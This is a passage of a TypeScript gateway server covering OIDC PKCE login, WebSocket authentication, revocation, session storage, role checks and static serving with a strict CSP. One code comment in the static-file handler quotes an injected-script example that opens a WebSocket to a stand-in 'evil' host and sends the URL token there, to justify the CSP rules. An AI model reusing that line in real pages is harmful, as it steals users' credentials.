		authUrl.searchParams.set("code_challenge", challenge);
		authUrl.searchParams.set("code_challenge_method", "S256");

		const pkceCookie = `__Host-perimeter_pkce=${cookieVal}; Path=/; Max-Age=300; HttpOnly; Secure; SameSite=Lax`;
		res.writeHead(302, {
			location: authUrl.toString(),
			"set-cookie": pkceCookie,
			"cache-control": "no-store",
		}).end();
	}

	async #handleOidcCallback(
		req: IncomingMessage,
		res: ServerResponse,
		url: URL,
		send: (status: number, headers?: Record<string, string>) => void,
	): Promise<void> {
		if (!this.#cfg.oidc) return send(404);
		if (req.method !== "GET") return send(405, { allow: "GET" });

		const code = url.searchParams.get("code");
		const state = url.searchParams.get("state");
		if (!code || !state) return send(400);

		const clearPkceCookie = `__Host-perimeter_pkce=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Lax`;
		const rawCookie = cookieOf(req.headers.cookie, "__Host-perimeter_pkce");
		if (!rawCookie) return send(400, { "set-cookie": clearPkceCookie });

		const parts = rawCookie.split(".");
		if (parts.length !== 2 || !parts[0] || !parts[1]) return send(400, { "set-cookie": clearPkceCookie });
		const payloadB64 = parts[0];
		const sig = parts[1];
		const expectedSig = createHmac("sha256", this.#pkceSecret).update(payloadB64).digest("base64url");
		const sigBuf = Buffer.from(sig);
		const expectedBuf = Buffer.from(expectedSig);
		if (sigBuf.length !== expectedBuf.length || !timingSafeEqual(sigBuf, expectedBuf)) {
			return send(400, { "set-cookie": clearPkceCookie });
		}

		let pkceData: { verifier: string; state: string; nonce: string; exp: number };
		try {
			pkceData = JSON.parse(Buffer.from(payloadB64, "base64url").toString("utf8"));
		} catch {
			return send(400, { "set-cookie": clearPkceCookie });
		}

		if (Date.now() > pkceData.exp || pkceData.state !== state) {
			return send(400, { "set-cookie": clearPkceCookie });
		}

		let tokenUrl: URL;
		try {
			tokenUrl = new URL(this.#cfg.oidc.tokenEndpoint);
		} catch {
			return send(500, { "set-cookie": clearPkceCookie });
		}
		if (tokenUrl.protocol !== "https:" && !(this.#cfg.oidc.allowHttp && tokenUrl.protocol === "http:")) {
			return send(400, { "set-cookie": clearPkceCookie });
		}

		// 整个 callback 工作（Token 交换与 JWT 验签）共享真实 AuthWorkGate
		if (!this.#authGate.acquire()) {
			return send(503, { "set-cookie": clearPkceCookie });
		}

		const ctrl = new AbortController();
		this.#authControllers.add(ctrl);
		req.socket?.on("close", () => {
			if (!res.writableEnded && req.socket?.destroyed) ctrl.abort();
		});

		const timer = setTimeout(() => ctrl.abort(), this.#cfg.authTimeoutMs ?? 5000);
		timer.unref();

		try {
			const body = new URLSearchParams({
				grant_type: "authorization_code",
				code,
				code_verifier: pkceData.verifier,
				redirect_uri: this.#cfg.oidc.redirectUri,
				client_id: this.#cfg.oidc.clientId,
			});
			if (this.#cfg.oidc.clientSecret) {
				body.set("client_secret", this.#cfg.oidc.clientSecret);
			}

			let tokenRes: Response;
			try {
				tokenRes = await fetch(tokenUrl, {
					method: "POST",
					headers: {
						"content-type": "application/x-www-form-urlencoded",
						accept: "application/json",
					},
					body: body.toString(),
					redirect: "manual", // 严格 manual，防止跟随重定向
					signal: ctrl.signal,
				});
			} catch {
				return send(502, { "set-cookie": clearPkceCookie });
			}

			if (!tokenRes.ok) {
				return send(401, { "set-cookie": clearPkceCookie });
			}

			let tokenData: any;
			try {
				const reader = tokenRes.body?.getReader();
				if (!reader) throw new Error("no reader");
				const chunks: Uint8Array[] = [];
				let total = 0;
				while (true) {
					const { done, value } = await reader.read();
					if (done) break;
					total += value.length;
					if (total > 64 * 1024) throw new Error("response too large");
					chunks.push(value);
				}
				const text = Buffer.concat(chunks).toString("utf8");
				tokenData = JSON.parse(text);
			} catch {
				return send(400, { "set-cookie": clearPkceCookie });
			}

			const idToken = tokenData.id_token ?? tokenData.access_token;
			if (typeof idToken !== "string") {
				return send(401, { "set-cookie": clearPkceCookie });
			}

			let principal: Principal;
			try {
				principal = await this.#cfg.auth!.authenticate(idToken, { signal: ctrl.signal });
			} catch {
				return send(401, { "set-cookie": clearPkceCookie });
			}

			if (ctrl.signal.aborted || this.#closed) {
				return send(504, { "set-cookie": clearPkceCookie });
			}

			// 严格校验 id_token 中的 nonce claim 匹配及多受众 azp 绑定
			try {
				const tokenParts = idToken.split(".");
				if (tokenParts.length < 2 || !tokenParts[1]) return send(401, { "set-cookie": clearPkceCookie });
				const claims = JSON.parse(Buffer.from(tokenParts[1], "base64url").toString("utf8"));
				if (claims.nonce !== pkceData.nonce) {
					return send(401, { "set-cookie": clearPkceCookie });
				}
				const isMultiAud = Array.isArray(claims.aud) && claims.aud.length > 1;
				if (isMultiAud && (!claims.azp || claims.azp !== this.#cfg.oidc.clientId)) {
					return send(401, { "set-cookie": clearPkceCookie });
				}
				if (claims.azp !== undefined && claims.azp !== this.#cfg.oidc.clientId) {
					return send(401, { "set-cookie": clearPkceCookie });
				}
			} catch {
				return send(401, { "set-cookie": clearPkceCookie });
			}

			if (this.#revoked.has(principal.id)) {
				return send(401, { "set-cookie": clearPkceCookie });
			}

			let session: { id: string; expiresAt: number };
			try {
				session = this.#browser.create(principal, this.#cfg.browserSessionMaxMs ?? 8 * 3600_000);
				this.#saveSessions();
			} catch {
				return send(503, { "set-cookie": clearPkceCookie });
			}

			const maxAge = Math.max(0, Math.floor((session.expiresAt - Date.now()) / 1000));
			const sessionCookie = `${SESSION_COOKIE}=${session.id}; Path=/; Max-Age=${maxAge}; HttpOnly; Secure; SameSite=Strict`;

			res.writeHead(302, {
				location: "/",
				"set-cookie": [sessionCookie, clearPkceCookie],
				"cache-control": "no-store",
			}).end();
		} finally {
			clearTimeout(timer);
			this.#authControllers.delete(ctrl);
			this.#authGate.release();
		}
	}

	async #onUpgrade(req: IncomingMessage, socket: Duplex, head: Buffer): Promise<void> {
		let url: URL;
		try { url = new URL(req.url ?? "/", "http://localhost"); } catch { return reject(socket, 400, "Bad Request"); }
		if (!this.#hostOk(req)) return reject(socket, 421, "Misdirected Request");
		const origin = req.headers.origin;
		if (origin !== undefined && (typeof origin !== "string" || !this.#originOk(origin))) return reject(socket, 403, "Forbidden");
		// S3a：关闭中（drain 或已 close）拒绝一切新升级 —— 不再新建会话或接入
		if (this.#draining || this.#closed) return reject(socket, 503, "Service Unavailable");
		if (this.#conns.size + this.#pending >= this.#limits.maxConnections) return reject(socket, 503, "Service Unavailable");
		this.#pending++;
		let identity: { actor: string; principal?: Principal; expiresAt: number; sid?: string } | undefined;
		try {
			const clientCtrl = new AbortController();
			socket.on("close", () => {
				if (socket.destroyed) clientCtrl.abort();
			});
			const authRes = await this.#authenticateWS(req, url, origin, () => socket.destroy(), clientCtrl.signal);
			if (!authRes.ok) {
				if (authRes.reason === "busy") return reject(socket, 503, "Service Unavailable");
				if (authRes.reason === "timeout") return reject(socket, 504, "Gateway Timeout");
				return reject(socket, 401, "Unauthorized");
			}
			identity = authRes.val;
		} finally {
			this.#pending--;
		}
		if (!identity) return reject(socket, 401, "Unauthorized");
		if (socket.destroyed || this.#closed) return;

		// 异步验签结束后重新校验吊销与过期状态（防止验签在途时发生吊销）
		if (this.#revoked.has(identity.actor) || (identity.principal && this.#revoked.has(identity.principal.id))) {
			return reject(socket, 401, "Unauthorized");
		}
		if (identity.expiresAt <= Date.now()) {
			return reject(socket, 401, "Unauthorized");
		}

		if ([...this.#conns].filter((c) => c.actor === identity.actor).length >= this.#limits.maxConnectionsPerPrincipal) return reject(socket, 429, "Too Many Requests");
		this.#wss.handleUpgrade(req, socket, head, (ws) => this.#onConnection(ws, req, identity!));
	}

	async #authenticateWS(
		req: IncomingMessage,
		url: URL,
		origin: string | undefined,
		onTimeout: () => void,
		signal?: AbortSignal,
	): Promise<
		| { ok: true; val: { actor: string; principal?: Principal; expiresAt: number; sid?: string } }
		| { ok: false; reason: "busy" | "timeout" | "unauthorized" }
	> {
		const header = bearer(req.headers.authorization);
		if (this.#cfg.mode === "demo") {
			const token = url.searchParams.get("token") ?? header;
			if (token && timingSafeEqual(createHash("sha256").update(token).digest(), this.#demoToken!)) {
				// demo：actor 由客户端自报，仅用于演示多人协作，不是身份
				const actor = url.searchParams.get("actor") ?? "demo@local";
				if (actor.length > 256) return { ok: false, reason: "unauthorized" };
				return { ok: true, val: { actor, expiresAt: Infinity } };
			}
			// R76-R3：demo 会话 Cookie（/auth/session 以静态网关 token 换得，与生产同形态）——
			// app.js「hash token → 换 Cookie → 带 Cookie 的 WS」流程在 demo 可用；identity 不带
			// principal（与 query 路径同为自报 actor 口径，重连身份一致）。Cookie 无效 → 401。
			const sid = cookieOf(req.headers.cookie, SESSION_COOKIE);
			if (sid) {
				const principal = this.#browser.get(sid);
				if (!principal || this.#revoked.has(principal.id) || principal.expiresAt <= Date.now()) {
					return { ok: false, reason: "unauthorized" };
				}
				return { ok: true, val: { actor: principal.id, expiresAt: principal.expiresAt } };
			}
			return { ok: false, reason: "unauthorized" };
		}
		// production：query 里出现凭据或身份一律拒绝，不忽略、不降级
		if (url.searchParams.has("token") || url.searchParams.has("actor")) return { ok: false, reason: "unauthorized" };
		let principal: Principal | undefined;
		let sid: string | undefined;
		if (header) {
			const authRes = await this.#executeAuth(header, onTimeout, signal);
			if (!authRes.ok) return authRes;
			principal = authRes.val;
		} else {
			// cookie 凭证必须带精确命中的 Origin（防跨站 WebSocket 劫持）
			sid = cookieOf(req.headers.cookie, SESSION_COOKIE);
			if (!sid || origin === undefined) return { ok: false, reason: "unauthorized" };
			principal = this.#browser.get(sid);
		}
		if (!principal || this.#revoked.has(principal.id)) return { ok: false, reason: "unauthorized" };
		return { ok: true, val: { actor: principal.id, principal, expiresAt: principal.expiresAt, sid } };
	}

	#loadRevocations(): void {
		const isExistingState =
			existsSync(this.#sessionsFile) ||
			existsSync(join(this.#stateRoot, "sessions")) ||
			existsSync(join(this.#stateRoot, ".initialized"));

		if (!existsSync(this.#revocationsFile)) {
			if (isExistingState) {
				const errMsg = "吊销记录文件 revocations.json 缺失，已初始化实例存在吊销状态丢失风险，fail-closed 拒绝启动";
				this.#tryAudit({
					kind: "error",
					sessionId: "-",
					actor: "system",
					summary: errMsg,
					verdict: "deny",
				});
				throw new Error(errMsg);
			}
			// 全新初始化 stateRoot，创建初始 revocations.json（0600）与 .initialized 标记
			this.#saveRevocations();
			try {
				writeFileSync(join(this.#stateRoot, ".initialized"), new Date().toISOString(), { mode: 0o600 });
				chmodSync(join(this.#stateRoot, ".initialized"), 0o600);
			} catch {}
			return;
		}

		try {
			chmodSync(this.#revocationsFile, 0o600);
		} catch {}

		try {
			const raw = readFileSync(this.#revocationsFile, "utf8");
			const parsed = JSON.parse(raw);
			if (!parsed || typeof parsed !== "object" || !Array.isArray(parsed.revoked)) {
				throw new Error("revocations.json 缺少 revoked 数组");
			}
			for (const id of parsed.revoked) {
				if (typeof id !== "string") {
					throw new Error("revocations.json 包含非字符串主体 ID");
				}
				this.#revoked.add(id);
			}
		} catch (err) {
			throw new Error(`吊销存储损坏，fail-closed 拒绝启动: ${err instanceof Error ? err.message : String(err)}`);
		}
	}

	#saveRevocations(): void {
		const tmp = this.#revocationsFile + ".tmp";
		const data = JSON.stringify({ revoked: [...this.#revoked], updatedAt: new Date().toISOString() }, null, 2);
		writeFileSync(tmp, data, { mode: 0o600, encoding: "utf8" });
		try { chmodSync(tmp, 0o600); } catch {}
		renameSync(tmp, this.#revocationsFile);
		try { chmodSync(this.#revocationsFile, 0o600); } catch {}
	}

	#loadSessions(): void {
		if (!existsSync(this.#sessionsFile)) return;
		try {
			chmodSync(this.#sessionsFile, 0o600);
		} catch {}
		try {
			const raw = readFileSync(this.#sessionsFile, "utf8");
			const parsed = JSON.parse(raw);
			if (!Array.isArray(parsed)) throw new Error("browser-sessions.json 必须是数组");
			for (const item of parsed) {
				if (!item || typeof item !== "object") throw new Error("browser-sessions.json 包含非法条目");
				const sid = typeof item.sessionId === "string" ? item.sessionId : (typeof item.id === "string" ? item.id : undefined);
				if (!sid) throw new Error("会话条目缺少有效会话 ID");
				const principal: Principal | undefined = item.principal ?? (item.subject && item.issuer ? {
					id: typeof item.id === "string" && item.id.includes("|") ? item.id : `${item.issuer}|${item.subject}`,
					issuer: item.issuer,
					subject: item.subject,
					groups: Array.isArray(item.groups) ? item.groups : [],
					expiresAt: typeof item.expiresAt === "number" ? item.expiresAt : item.sessionExpiresAt,
				} : undefined);
				if (!principal || typeof principal !== "object" || typeof principal.id !== "string") {
					throw new Error("会话条目缺少有效 principal");
				}
				const sessionExp = typeof item.sessionExpiresAt === "number" ? item.sessionExpiresAt : principal.expiresAt;
				if (typeof sessionExp !== "number" || !Number.isFinite(sessionExp)) {
					throw new Error("会话条目缺少有效过期时间");
				}

				// 崩溃窗口防线：使用真正的 principal.id 比对吊销名单！
				if (this.#revoked.has(principal.id)) {
					continue;
				}

				if (sessionExp > Date.now()) {
					const ok = this.#browser.restore(sid, principal, sessionExp);
					if (!ok) throw new Error("会话条目恢复校验失败");
				}
			}
		} catch (err) {
			throw new Error(`会话存储损坏，fail-closed 拒绝启动: ${err instanceof Error ? err.message : String(err)}`);
		}
	}

	#saveSessions(): void {
		const tmp = this.#sessionsFile + ".tmp";
		const data = JSON.stringify(this.#browser.dump(), null, 2);
		writeFileSync(tmp, data, { mode: 0o600, encoding: "utf8" });
		try { chmodSync(tmp, 0o600); } catch {}
		renameSync(tmp, this.#sessionsFile);
		try { chmodSync(this.#sessionsFile, 0o600); } catch {}
	}

	/** 离职/撤权：废止其浏览器会话、立即断开全部现存连接，并拒绝其后续接入，直到 restorePrincipal */
	revokePrincipal(principalId: string): void {
		// R-Q52-5：先内存撤全部，再各自独立尝试保存/清理；首 err 收集不遮原清理链，
		// 最终固定审计 + 重抛非零可见（不把资源退役装成成功终止）。
		let firstErr: unknown = null;
		if (this.#cfg.gitGrants) {
			try { this.#revokeGitGrantPrincipal(principalId); } catch (err) { firstErr ??= err; }
		}
		try { this.#revoked.add(principalId); } catch (err) { firstErr ??= err; }
		try { this.#saveRevocations(); } catch (err) { firstErr ??= err; }
		try { this.#browser.revokePrincipal(principalId); } catch (err) { firstErr ??= err; }
		try { this.#saveSessions(); } catch (err) { firstErr ??= err; }
		for (const conn of [...this.#conns]) {
			if (conn.actor === principalId) {
				try {
					conn.revoked = true;
					conn.closed = true;
					conn.outbox.clear();
					conn.ws.close(4001, "凭证已吊销");
				} catch (err) { firstErr ??= err; }
			}
		}
		for (const session of this.#sessions.values()) {
			try { void session.expirePending(principalId); } catch (err) { firstErr ??= err; }
		}
		if (firstErr !== null) {
			try { this.#audit.append({ kind: "error", sessionId: "system", actor: principalId, summary: "principal 吊销链部分失败（内存撤销已生效；固定类别）" }); } catch { /* 审计也失败：仍重抛 */ }
			throw firstErr;
		}
	}

	restorePrincipal(principalId: string): void {
		this.#revoked.delete(principalId);
		this.#saveRevocations();
	}

	#serveStatic(req: IncomingMessage, res: ServerResponse, url: URL): void {
		let rel: string;
		try { rel = url.pathname === "/" ? "/index.html" : decodeURIComponent(url.pathname); } catch { res.writeHead(400).end("bad request"); return; }
		const file = resolve(join(this.#webRoot, normalize(rel)));
		let isFile = false;
		try {
			const realRoot = realpathSync(this.#webRoot);
			const realFile = realpathSync(file);
			isFile = (realFile === realRoot || realFile.startsWith(realRoot + sep)) && statSync(realFile).isFile();
		} catch {
			/* 不存在、死链接或符号链接逃出目录 */
		}
		if (!isFile) {
			res.writeHead(404).end("not found");
			return;
		}
		res.writeHead(200, {
			"content-type": MIME[extname(file)] ?? "application/octet-stream",
			// demo 的 token 在 URL 里（已声明取舍），正因如此更需要 CSP 兜住 XSS。
			// connect-src **不能**写 `ws: wss:` —— 那是 scheme-source，匹配任意主机，
			// 注入的脚本一句 new WebSocket("wss://evil/?t="+location.search) 就把
			// token 送走了。CSP3 规定 'self' 匹配同源的 ws/wss，够用。
			// form-action 是 connect-src 之外的第二条外传路径，且不回落到 default-src。
			"content-security-policy":
				"default-src 'self'; connect-src 'self'; img-src 'self' data:; " +
				"form-action 'none'; base-uri 'none'; frame-ancestors 'none'",
			"x-frame-options": "DENY",
			"x-content-type-options": "nosniff",
			"referrer-policy": "no-referrer",
		});
		if (req.method === "HEAD") { res.end(); return; }
		const stream = createReadStream(file);
		stream.on("error", () => res.destroy());
		res.on("close", () => stream.destroy());
		stream.pipe(res);
	}
}

/**
 * R72-C3：由部署配置的 SCM 仓库 URL 推导 grant.repo（= 代理 RepoMapping 名，合同 A2 全等口径：
 * host[/port] + path，去前导斜杠）。必须已在 gitGrants.repos 登记，否则返回 null —— 签发端
 * fail-closed 不签发（不猜、不回落到策略作用域标签 metadata.repo）。
 */
export function scmGrantRepo(repoUrl: string | undefined, repos: ReadonlyArray<{ name: string }> | undefined): string | null {
	if (!repoUrl || !repos || repos.length === 0) return null;
	let u: URL;
	try {
		u = new URL(repoUrl);
	} catch {
		return null;
	}
	if (u.protocol !== "https:" && u.protocol !== "http:") return null;
	if (u.search || u.hash) return null;
	const path = u.pathname.replace(/^\/+/, "").replace(/\/+$/, "");
	if (!path) return null;
	const host = u.port ? `${u.hostname}:${u.port}` : u.hostname;
	const name = `${host}/${path}`;
	return repos.some((r) => r.name === name) ? name : null;
}

/** 一个会话可以同时连着多个传输（刷新页面、多标签），事件广播给全部 */
const transports = new WeakMap<Session, Set<Conn>>();

const FORBIDDEN_ACTOR_KEYS = new Set(["__proto__", "constructor", "prototype"]);

interface AttachOpts {
	limits: Limits;
	conns: Set<Conn>;
	expiresAt: number;
	sid?: string;
	principal?: Principal;
	revoked: Set<string>;
	isAuthorized: (actor: string, meta: Meta) => boolean;
	isPrincipalId?: (id: string) => boolean;
	/** S3a：网关正在关闭（drain/close）—— 新 prompt/steer 在网关门上被拒，abort/approve 不受限 */
	gatewayDraining?: () => boolean;
	/** S3b：显式 create 是网关级操作（收据幂等），不属于当前会话；由网关判定并定向应答 */
	handleCreate?: (conn: Conn, cmd: Extract<ClientCommand, { type: "create" }>, actor: string) => void;
}

function attach(ws: WebSocket, session: Session, actor: string, opts: AttachOpts): void {
	const set = transports.get(session) ?? new Set<Conn>();
	const conn: Conn = { ws, actor, principal: opts.principal, outbox: new Outbox(ws, opts.limits), overflow: true, expiresAt: opts.expiresAt, sid: opts.sid };
	set.add(conn);
	opts.conns.add(conn);
	transports.set(session, set);
	session.publish({ type: "session.presence", participants: participants(session) });
	const sendError = (message: string) => conn.outbox.send(JSON.stringify({ event: { type: "error", code: "command_failed", message } }));

	// 连接不能活过凭证：到期关闭（setTimeout 上限约 24.8 天，超长的靠 message 时的再检查兜底）
	const ttl = conn.expiresAt - Date.now();
	const expiry = Number.isFinite(ttl) ? setTimeout(() => ws.close(4001, "凭证已过期"), Math.min(Math.max(ttl, 0), 2 ** 31 - 1)) : undefined;
	expiry?.unref();
	// 半开连接探测：一个周期内没有 pong 就终止
	let alive = true;
	ws.on("pong", () => { alive = true; });
	const heartbeat = setInterval(() => { if (!alive) { ws.terminate(); return; } alive = false; ws.ping(); }, 15_000);
	heartbeat.unref();
	const rate = new RateLimiter(opts.limits.maxCommandsPerSecond);

	ws.on("message", (raw, isBinary) => {
		if (conn.closed || conn.revoked || conn.ws.readyState !== ws.OPEN) return;
		if (opts.revoked.has(conn.actor)) {
			conn.revoked = true;
			conn.closed = true;
			conn.outbox.clear();
			ws.close(4001, "凭证已吊销");
			return;
		}
		if (isBinary) { ws.close(1003, "只接受文本帧"); return; }
		if (!rate.allow()) { ws.close(1008, "命令过于频繁"); return; }
		if (Date.now() >= conn.expiresAt) { ws.close(4001, "凭证已过期"); return; }
		let parsed: unknown;
		try {
			parsed = JSON.parse(String(raw));
		} catch {
			conn.outbox.send(JSON.stringify({ type: "control", control: "error", message: "非法的命令 JSON" }));
			return;
		}
		// 入站必须过运行时校验：类型、长度、枚举、未知字段。校验失败只回给发送者，不广播、不审计为命令
		const checked = parseCommand(parsed, opts.limits.maxPromptBytes);
		if (!checked.ok) { sendError(checked.error); return; }
		const cmd = checked.cmd;
		// 审批人是实际点下按钮的那条连接，不是会话创建者
		try {
			const meta = metas.get(session)!;
			if (!opts.isAuthorized(actor, meta.data)) {
				sendError("资源权限已撤销");
				set.delete(conn);
				opts.conns.delete(conn);
				conn.closed = true;
				conn.outbox.clear();
				conn.ws.close(4003, "资源权限已撤销");
				void session.expirePending(actor);
				session.publish({ type: "session.presence", participants: participants(session) });
				return;
			}
			if (cmd.type === "create") {
				// S3b：显式创建是网关级操作（收据幂等），不写当前会话的命令审计；viewer/approver 无创建权
				const role = roleOf(meta.data, actor);
				if (!role || role === "viewer" || role === "approver") { sendError("无权创建会话：只有 owner 与 editor 可创建"); return; }
				opts.handleCreate?.(conn, cmd, actor);
				return;
			}
			if (cmd.type === "history.page") {
				// S5a：只读历史分页 —— 与 attach 同一资源门（上方 isAuthorized 已过），任何成员角色
				// （含 viewer）可读；不写命令审计（高频读操作不刷审计链）。连接与会话一一对应：
				// 命令里的 sessionId 必须就是本会话，跨会话固定拒绝（不泄漏其他会话的存在性）
				if (!roleOf(meta.data, actor)) { sendError("无权读取该会话（固定类别）"); return; }
				if (cmd.sessionId !== session.sessionId) { sendError("history.page 会话不匹配（固定类别）"); return; }
				session.handle(cmd, actor, conn);
				return;
			}
			session.auditCommand(actor, cmd.type);
			const role = roleOf(meta.data, actor);
			if (!role || role === "viewer") { sendError("无权执行命令"); return; }
			if (cmd.type === "share" || cmd.type === "unshare") {
				if (role !== "owner" || cmd.actor === meta.data.owner || cmd.actor === actor || FORBIDDEN_ACTOR_KEYS.has(cmd.actor) || (opts.isPrincipalId && !opts.isPrincipalId(cmd.actor))) {
					sendError("非法共享命令或无权共享"); return;
				}
				const members = { ...meta.data.members };
				if (cmd.type === "share") members[cmd.actor] = cmd.role;
				else delete members[cmd.actor];
				const aclVersion = (meta.data.aclVersion ?? 1) + 1;
				meta.data.aclVersion = aclVersion;
				writeFileSync(meta.file + ".tmp", JSON.stringify({ ...meta.data, members, aclVersion })); renameSync(meta.file + ".tmp", meta.file);
				meta.data.members = members;
				session.setAclVersion(aclVersion);
				void session.expirePending();
				for (const client of set) if (!roleOf(meta.data, client.actor)) {
					set.delete(client);
					client.closed = true;
					client.outbox.clear();
					client.ws.close(4003, "共享已撤销");
				}
				session.publish({ type: "session.presence", participants: participants(session) });
				return;
			}
			if (cmd.type === "prompt" || cmd.type === "steer" || cmd.type === "abort") {
				if (role !== "owner" && role !== "editor") {
					sendError("无权执行命令：只有 owner 与 editor 可发起任务或中止");
					return;
				}
			}
			// S3a：有序关闭中拒新任务（固定类别）；abort/approve 不受限（手动收尾与在途审批）
			if ((cmd.type === "prompt" || cmd.type === "steer") && opts.gatewayDraining?.()) {
				sendError("网关正在关闭，拒绝新任务");
				return;
			}
			if (cmd.type === "approve") {
				if (role !== "approver") {
					sendError("无权审批：只有 approver 角色可审批");
					return;
				}
			}
			session.handle(cmd, actor, conn);
		} catch { sendError("命令提交失败"); }
	});
	const cleanup = () => { clearTimeout(expiry); clearInterval(heartbeat); opts.conns.delete(conn); };
	ws.on("close", () => { cleanup(); set.delete(conn); session.publish({ type: "session.presence", participants: participants(session) }); });
	// 传输层错误不应连带打死会话：任务在服务端继续跑，用户重连即可续上
	ws.on("error", () => { cleanup(); set.delete(conn); });

	// 控制帧不参与 seq 序列。之前这里发的是一条 seq=lastSeq 的伪 session.state，
	// 它会把前端的 state.seq 直接顶到最新，导致随后 resume 补发的事件
	// 全部被「seq <= state.seq」的去重逻辑丢掉 —— 断线期间的事件实际补不回来。
	conn.outbox.send(JSON.stringify({ type: "control", control: "attached", lastSeq: session.lastSeq }));
	void session.start().then(() => session.snapshotFrame((frame) => {
		conn.overflow = false;
		if (conn.closed || conn.revoked || conn.ws.readyState !== conn.ws.OPEN || opts.revoked.has(conn.actor)) return;
		if (!opts.isAuthorized(conn.actor, metas.get(session)!.data)) {
			conn.closed = true;
			conn.outbox.clear();
			conn.ws.close(4003, "资源权限已撤销");
			void session.expirePending(conn.actor);
			return;
		}
		if (frame.event.type === "session.snapshot") frame.event.view = {
			...frame.event.view, role: roleOf(metas.get(session)!.data, conn.actor)!, participants: participants(session),
		};
		conn.outbox.send(JSON.stringify(frame));
	})).catch(() => { conn.overflow = false; });
}

function broadcast(
	session: Session,
	event: ClientEvent,
	seq: number,
	target?: unknown,
	isAuthorized?: (actor: string, principal: Principal | undefined, meta: Meta) => boolean,
): void {
	const meta = metas.get(session)!.data;
	for (const conn of transports.get(session) ?? []) {
		if (target && conn !== target) continue;
		if (conn.closed || conn.revoked || conn.ws.readyState !== conn.ws.OPEN || conn.outbox.dead) continue;
		if (isAuthorized && !isAuthorized(conn.actor, conn.principal, meta)) {
			conn.closed = true;
			conn.outbox.clear();
			conn.ws.close(4003, "资源权限已撤销");
			void session.expirePending(conn.actor);
			continue;
		}
		const personalized = event.type === "session.snapshot" ? {
			...event, view: { ...event.view, role: roleOf(meta, conn.actor), participants: participants(session) },
		} : event.type === "session.presence" ? { ...event, role: roleOf(meta, conn.actor) } : event;
		const payload = JSON.stringify({ seq, event: personalized });
		if (conn.overflow) {
			if ((event.type === "error" || event.type === "session.ready") && conn.outbox.length < 100) conn.outbox.send(payload);
			continue;
		}
		if (conn.outbox.length >= 100) {
			conn.outbox.clear();
			conn.overflow = true;
			void session.snapshotFrame((frame) => {
				conn.overflow = false;
				if (conn.closed || conn.revoked || conn.ws.readyState !== conn.ws.OPEN) return;
				if (isAuthorized && !isAuthorized(conn.actor, conn.principal, meta)) {
					conn.closed = true;
					conn.outbox.clear();
					conn.ws.close(4003, "资源权限已撤销");
					void session.expirePending(conn.actor);
					return;
				}
				if (frame.event.type === "session.snapshot") frame.event.view = {
					...frame.event.view, role: roleOf(meta, conn.actor)!, participants: participants(session),
				};
				conn.outbox.send(JSON.stringify(frame));
			}).catch(() => conn.ws.close());
		} else conn.outbox.send(payload);
	}
}

interface Meta { id: string; owner: string; repo: string; team: string; createdAt: string; members: Record<string, Role>; aclVersion?: number }
function roleOf(meta: Meta, actor: string): Role | undefined { return Object.hasOwn(meta.members, actor) ? meta.members[actor] : undefined; }
const metas = new WeakMap<Session, { file: string; data: Meta }>();
function participants(session: Session) {
	const counts = new Map<string, number>();
	for (const conn of transports.get(session) ?? []) counts.set(conn.actor, (counts.get(conn.actor) ?? 0) + 1);
	return [...counts].map(([actor, clients]) => ({ actor, clients, role: roleOf(metas.get(session)!.data, actor)! }));
}

/** 握手后的拒绝：控制帧也受限，所有发送走统一 Outbox 限额 */
function closeWith(ws: WebSocket, message: string, limits?: Limits): void {
	const outbox = new Outbox(ws, limits ?? DEFAULT_LIMITS);
	outbox.send(JSON.stringify({ type: "control", control: "error", message }));
	ws.close(4003, message);
}

function bearer(header: string | undefined): string | null {
	return header?.startsWith("Bearer ") ? header.slice(7) : null;
}

function cookieOf(header: string | undefined, name: string): string | undefined {
	for (const part of (header ?? "").split(";")) {
		const i = part.indexOf("=");
		if (i > 0 && part.slice(0, i).trim() === name) return part.slice(i + 1).trim() || undefined;
	}
}

/** 握手阶段拒绝：升级前还没有 WebSocket，只能直接写 HTTP 响应 */
function reject(socket: Duplex, status: number, text: string): void {
	if (socket.destroyed) return;
	socket.end(`HTTP/1.1 ${status} ${text}\r\nConnection: close\r\nContent-Length: 0\r\n\r\n`);
}

async function withTimeout<T>(
	promise: Promise<T>,
	timeoutMs: number,
	onTimeout?: () => void,
): Promise<{ ok: true; val: T } | { ok: false; timedOut: boolean; err?: unknown }> {
	let timer: NodeJS.Timeout;
	let settled = false;
	const timeoutPromise = new Promise<{ ok: false; timedOut: true }>((resolve) => {
		timer = setTimeout(() => {
			if (!settled) {
				settled = true;
				onTimeout?.();
				resolve({ ok: false, timedOut: true });
			}
		}, timeoutMs);
		timer.unref();
	});
	try {
		const res = await Promise.race([
			promise.then(
				(val) => { settled = true; return { ok: true as const, val }; },
				(err) => { settled = true; return { ok: false as const, timedOut: false as const, err }; },
			),
			timeoutPromise,
		]);
		return res;
	} finally {
		clearTimeout(timer!);
	}
}

// 直接运行时按环境变量启动
if (process.argv[1] && import.meta.filename === process.argv[1]) {
	const root = join(import.meta.dirname, "..", "..");
	const mode = process.env.PERIMETER_MODE;
	if (mode !== "demo" && mode !== "production") throw new Error("必须显式设置 PERIMETER_MODE=demo|production（生产不存在默认模式）");
	const list = (name: string) => (process.env[name] ?? "").split(",").map((s) => s.trim()).filter(Boolean);
	const need = (name: string) => process.env[name] || (() => { throw new Error(`production 缺少 ${name}`); })();
	// S4c：模型 scoped 凭证签发密钥（与模型网关 scopedTokenKey 同一密钥）。编码二选一：
	// 纯 hex（偶数长度，32 字节 = 64 个 hex 字符）或 base64url；先按 hex 试，非纯 hex 按
	// base64url 解（两字母表歧义仅存在于「偶数长度纯 hex」形态，按 hex 解释，口径固定于此）。
	const scopedKeyEnv = process.env.PERIMETER_MODEL_SCOPED_KEY;
	let modelScopedKey: Buffer | undefined;
	if (scopedKeyEnv) {
		const raw = scopedKeyEnv.trim();
		modelScopedKey = /^[0-9a-fA-F]+$/.test(raw) && raw.length % 2 === 0 ? Buffer.from(raw, "hex") : Buffer.from(raw, "base64url");
		if (modelScopedKey.length < 32) throw new Error("PERIMETER_MODEL_SCOPED_KEY 解码后不足 32 字节（接受 hex 或 base64url）");
	}
	mkdirSync(join(root, "audit-data"), { recursive: true });
	const base = {
		port: Number(process.env.PORT ?? 8787),
		host: process.env.HOST ?? "127.0.0.1",
		policyFile: process.env.PERIMETER_POLICY_FILE ?? join(root, "config/policy.yaml"),
		auditFile: process.env.PERIMETER_AUDIT_FILE ?? join(root, "audit-data/audit.jsonl"),
		workspaceRoot: process.env.PERIMETER_WORKSPACES ?? join(root, "workspaces"),
		webRoot: join(root, "web"),
		model: {
